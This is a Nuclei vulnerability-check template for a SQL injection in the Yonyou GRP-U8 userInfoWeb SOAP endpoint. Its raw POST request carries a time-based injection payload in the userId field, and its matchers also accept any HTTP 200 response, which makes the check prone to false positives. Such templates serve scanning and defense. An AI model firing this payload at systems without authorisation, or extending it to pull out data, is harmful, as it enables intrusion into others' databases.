yongyouOA-userInfoWeb-sql.yaml

id: yongyouOA-userInfoWeb-sql
info:
  name: 用友GRP-U8-userInfoWeb存在SQL注入
  author: cnaq
  severity: high  
  description: 用友GRP-U8-userInfoWeb存在SQL注入
  reference: 
    - https://github.com/wy876/POC/blob/main/%E7%94%A8%E5%8F%8BGRP-U8-userInfoWeb%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5.md
  tags: yongyouOA,sql,injection 

requests:
  - raw:
      - |
        POST /services/userInfoWeb HTTP/1.1
        Host: {{Hostname}}
        Cache-Control: max-age=0
        Origin: null
        DNT: 1
        Upgrade-Insecure-Requests: 1
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9
        Connection: close
        SOAPAction: 
        Content-Type: text/xml;charset=UTF-8
        Content-Length: 558

        <soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ser="http://service.pt.midas.ufgov.com">
          <soapenv:Header/>
          <soapenv:Body>
              <ser:getUserNameById soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
                <userId xsi:type="soapenc:string" xmlns:soapenc="http://schemas.xmlsoap.org/soap/encoding/">';waitfor delay '0:0:5'--</userId>
              </ser:getUserNameById>
          </soapenv:Body>
        </soapenv:Envelope>

        
    matchers-condition: or
    matchers:
      - type: status
        status:
          - 200
      - type: dsl
        dsl:
          - 'duration>=5'
          - 'duration<8'
